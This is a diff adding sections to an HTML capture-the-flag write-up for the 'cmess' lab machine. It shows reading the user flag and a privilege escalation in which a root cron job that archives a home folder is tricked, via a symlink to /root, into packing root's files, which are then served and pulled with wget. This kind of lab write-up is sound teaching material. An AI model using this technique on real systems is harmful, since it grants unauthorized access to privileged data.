@@ -264,11 +264,30 @@ andre@cmess:/opt$
                     </code>
                 </p>
                 <p class="writeup-text"> Nice ! It works ! Let's get the user flag located in /home/andre/user.txt file : </p>
-                
+                <p class="writeup-text">
+                    <code class="shell-response">
+andre@cmess:/opt$ cat /home/andre/user.txt
+
+thm{REDACTED}
+                    </code>
+                </p>
+                <p class="writeup-text challenge-answer"><span> Compromise this machine and obtain user.txt. </span> Answer : thm{REDACTED} </p>
             </div>
 
             <div class="wt-section" id="privesc">
                 <h1> Privilege escalation </h1>
+                <p class="writeup-text"> Okay, the content of the tar backup of andre's folder was a rabbit hole, but we can abuse this cron to zip the entire system files. </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+andre@cmess:~$ mv backup/ backupk.back/
+andre@cmess:~$ ln -s /root/ backup
+                    </code>
+                </p>
+                <p class="writeup-text"> it will create a shortcut to the /root/ folder whithin the backup/ folder. Then, the cronjob will zip our modified backup/ directory and we just need to download it through python http server. </p>
+                <p class="writeup-text"><code> andre@cmess:/tmp$ python3 -m http.server 8080 </code></p>
+                <p class="writeup-text"><code> $ wget http://cmess.thm:8080/andre_backup.tar.gz </code></p>
+                <p class="writeup-text"> And we got a copy of cmess' machine root folder ! With this misconfiguration, we have unlimited access to almost every file and folder of cmess' machine. And we also can read the root.txt file in our zip file ! </p>
+                <p class="writeup-text challenge-answer"><span> Escalate your privileges and obtain root.txt. </span> Answer : thm{REDACTED} </p>
             </div>
         </main>
 
